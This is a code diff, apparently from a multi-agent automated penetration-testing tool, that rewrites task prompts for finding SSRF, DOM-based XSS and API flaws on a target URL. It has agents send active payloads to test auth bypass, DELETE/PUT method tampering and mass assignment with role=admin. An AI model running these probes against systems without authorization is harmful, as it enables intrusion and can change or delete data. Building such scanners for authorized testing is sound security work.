+    expected_output="List of verified SSRF vulnerabilities with body_snippet evidence of internal content or content_length differences.",
     agent=ssrf_agent,
     context=[recon_task]
 )
 
 dom_xss_task = Task(
     description='''Analyze {target_url} for DOM-based XSS:
-1. Use fetch_site_data on EACH page with parameters to get the full HTML and JavaScript (returned in the "body" field).
-2. Read the "body" field and search the actual JavaScript code for SOURCES: location.hash, location.search, document.URL, document.referrer, window.name.
-3. Search the actual JavaScript code for SINKS: innerHTML, document.write, eval(), setTimeout(string), jQuery .html().
-4. If a source feeds directly into a sink without DOMPurify sanitization, cite the exact JavaScript code line and construct a trigger URL.
-5. Use active_payload_tester to send the trigger URL. If "reflected": false but the source-to-sink flow exists in the code, it's DOM XSS.
-6. You MUST cite the actual JavaScript code from the body that shows the vulnerable flow. Do NOT guess or assume.''',
+1. Use fetch_site_data on each page that has parameters (from recon) to get the HTML and JavaScript (returned in the "body" field).
+2. Read the "body" field and search the JavaScript code for SOURCES: location.hash, location.search, document.URL, document.referrer, window.name.
+3. Search for SINKS: innerHTML, document.write, eval(), setTimeout(string), jQuery .html().
+4. If a source feeds directly into a sink without DOMPurify sanitization, cite the exact JavaScript code and construct a trigger URL.
+5. Use active_payload_tester to test the trigger URL. If "reflected": false but the source-to-sink flow exists, it's DOM XSS.
+6. You MUST cite the actual JavaScript code from the body. Do NOT guess or assume.''',
     expected_output="List of DOM XSS vulnerabilities with cited source code, source, sink, code flow, and trigger URL.",
     agent=dom_xss_agent,
     context=[recon_task]
@@ -825,12 +873,15 @@ dom_xss_task = Task(
 
 api_task = Task(
     description='''Test {target_url} API endpoints for security issues:
-1. From recon, identify /api/, /v1/, /v2/, /rest/, /graphql endpoints.
-2. Use fetch_site_data to probe /swagger.json, /openapi.json, /api-docs for exposed documentation.
-3. Use arjun_param_discovery on API endpoints to find hidden parameters.
-4. Use active_payload_tester to test auth bypass: send requests without auth headers — if 200 with data, it's broken auth.
-5. Test method tampering: send DELETE/PUT requests to read-only endpoints.''',
-    expected_output="List of API vulnerabilities: broken auth, exposed docs, hidden params, method tampering.",
+1. From recon data, identify /api/, /v1/, /v2/, /rest/, /graphql endpoints.
+2. Use fetch_site_data to probe /swagger.json, /openapi.json, /api-docs, /swagger/index.html for exposed documentation.
+3. For each API endpoint, use active_payload_tester to test:
+   - Auth bypass: Send request without auth → if 200 with data in body_snippet = BROKEN AUTH
+   - Method tampering: Send DELETE/PUT to read-only endpoints → if 200 = not restricted
+   - Mass assignment: Send parameter="role" payload="admin" via POST → check if reflected
+4. ONLY if you need deeper hidden parameter discovery, use arjun_param_discovery as fallback.
+Document findings with body_snippet evidence showing unauthorized data access or accepted parameters.''',
+    expected_output="List of API vulnerabilities with body_snippet evidence: broken auth, exposed docs, method tampering.",
     agent=api_agent,
     context=[recon_task]
 )
